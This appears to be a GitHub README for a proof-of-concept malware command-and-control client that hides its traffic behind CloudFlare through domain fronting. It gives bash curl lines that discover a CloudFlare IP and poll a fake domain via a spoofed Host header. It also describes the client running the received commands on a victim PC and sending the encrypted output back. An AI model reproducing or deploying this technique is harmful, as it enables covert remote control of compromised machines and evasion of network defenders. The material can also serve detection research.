# CloudFlare C&C POC
Before to start, let me say that I'm not a super expert on how to write a C&C client-server. This want to be a POC on how a Malware can hide behind a "fake" CloudFlare domain (see this post for more information: https://medium.com/@themiddleblue/cloudflare-domain-fronting-an-easy-way-to-reach-and-hide-a-malware-c-c-786255f0f437)

![](http://i.imgur.com/ZTsKokU.gif)

## How it work
The client, on the "Victim" PC, is a bash script that uses cURL to connect to CloudFlare and OpenSSL to encrypt all communications from and to CloudFlare/C&C. It simply make 2 HTTP request each *n* seconds: The first one, in order to discover a CloudFlare IP address, try to connect to a "real" CloudFlare website. The second one, make a fake request to CloudFlare to reach our C&C.

```bash
# get any usable CloudFlare IP address
CFIP=$(curl -v -I http://medium.com 2>&1 | egrep -o '\d+\.\d+\.\d+\.\d+' | head -1)

# get updates from my C&C
curl -H "Host: myfakedomain.com" "http://${CFIP}/?nocache=`date +%s`"
```

When the client receive an update, it decrypt the response_body and execute the command. Then it encrypt the command output and send it back to the C&C. The bash script uses OpenSSL to encrypt and decrypt.

![hiw](http://i.imgur.com/hYzqMWx.png)

## A dump of the client request
Following, a screenshot that shows how the client requests appear sniffing the http traffic on the victim PC.
![ws](http://i.imgur.com/ilVKfgV.png)

First, we have a CloudFlare IP `104.16.122.127` as a destination IP address:
```bash
$ whois 104.16.122.127
...
OrgName:        Cloudflare, Inc.
OrgId:          CLOUD14
Address:        101 Townsend Street
City:           San Francisco
StateProv:      CA
PostalCode:     94107
Country:        US
RegDate:        2010-07-09
Updated:        2017-02-17
Comment:        All Cloudflare abuse reporting can be done via https://www.cloudflare.com/abuse
Ref:            https://whois.arin.net/rest/org/CLOUD14
...
```

Then we see a POST request to `corriere.it` hostname (an italian daily newspaper), and in the request body we have the encrypted `ls -lart /tmp/` output.

## Info
What "Domain Fronting" is: https://en.wikipedia.org/wiki/Domain_fronting <br>
CloudFlare Domain Fronting: https://medium.com/@themiddleblue/cloudflare-domain-fronting-an-easy-way-to-reach-and-hide-a-malware-c-c-786255f0f437 <br>
theMiddle @twitter: https://twitter.com/Menin_TheMiddle <br>
